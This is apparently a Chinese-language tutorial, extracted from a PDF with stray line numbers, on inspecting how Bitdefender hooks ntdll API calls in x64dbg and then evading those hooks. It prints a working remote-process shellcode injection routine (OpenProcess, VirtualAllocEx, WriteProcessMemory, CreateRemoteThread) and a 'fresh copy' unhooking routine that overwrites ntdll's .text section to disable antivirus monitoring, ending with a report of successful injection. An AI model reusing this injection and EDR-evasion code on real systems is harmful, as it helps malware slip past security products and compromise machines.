测试环境安装了bitdefender，方便查看Hook情况，使用x64debug进行进程调试，运行notepad
进程，然后使用x64debug附加到进程，x64debug中断
在Symbols标签搜索Token类函数可以看到与Token类相关的函数。
我们选择NtAdjustGroupsToken,双击，便可以进入到该函数的调用流程
也就是我们常见的形式：
但如果我们选择NtAdjustPrivilegeToken：
可以看到直接进入了一个jmp的跳转。我们跟进去：
mov r10,rcx
1
mov eax,xx
2
syscall
3
里面是一些mov语句然后push rax，然后ret执行，我们可以使用Ctrl+G进跟踪
跟进去之后可以发现其调用了bitdefender的dll
除此之外可以勾选DLL Load，便可以清楚的在调试过程中看到DLL的Load情况
然后我们便可以知道我们的api调用会被atcuf64所截获。图示如下：
下面是Hook如何进行函数检测并使得我们常见的shellcode执行方法失效的。shellcode注入主要代码
demo如下：
unHook与代码注入
hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
1
PROCESS_VM_OPERATION | PROCESS_VM_READ |
 PROCESS_VM_WRITE,
2
FALSE, (DWORD) pid);
3
pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
4
WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, 
(SIZE_T *) NULL);
5
6
hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) 
pRemoteCode, NULL, 0, NULL);
7
if (hThread != NULL) {
8
WaitForSingleObject(hThread, 500);
9
CloseHandle(hThread);
10
return 0;
11
编译运行，无法注入到指定进程，因为所使用的函数已经被监控直接被干掉了.这里使用FreshCopy的
方式进行Unhook核心代码如下：
}
12
DWORD oldprotect = 0;
1
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
2
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + 
pImgDOSHead->e_lfanew);
3
    int i;
4
5
6
    unsigned char sVirtualProtect[] = { 
'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
7
8
    VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) 
GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
9
10
    // find .text section
11
    for (i = 0; i FileHeader.NumberOfSections; i++) {
12
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)
((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
13
                                                ((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER
 * i));
14
15
16
        if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
17
18
            VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead-
>VirtualAddress),
19
                            pImgSectionHead->Misc.VirtualSize,
20
                            PAGE_EXECUTE_READWRITE,
21
                            &oldprotect);
22
            if (!oldprotect) {
23
24
                    return -1;
25
            }
26
27
            memcpy( (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead-
>VirtualAddress),
28
                    (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead-
>VirtualAddress),
29
                    pImgSectionHead->Misc.VirtualSize);
30
unhook前
unhook之后，右键审计模块
31
32
33
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR) pImgSectionHead-
>VirtualAddress),
34
                            pImgSectionHead->Misc.VirtualSize,
35
                            oldprotect,
36
                            &oldprotect);
37
            if (!oldprotect) {
38
39
                    return -1;
40
            }
41
            return 0;
42
        }
43
    }
44
45
46
成功注入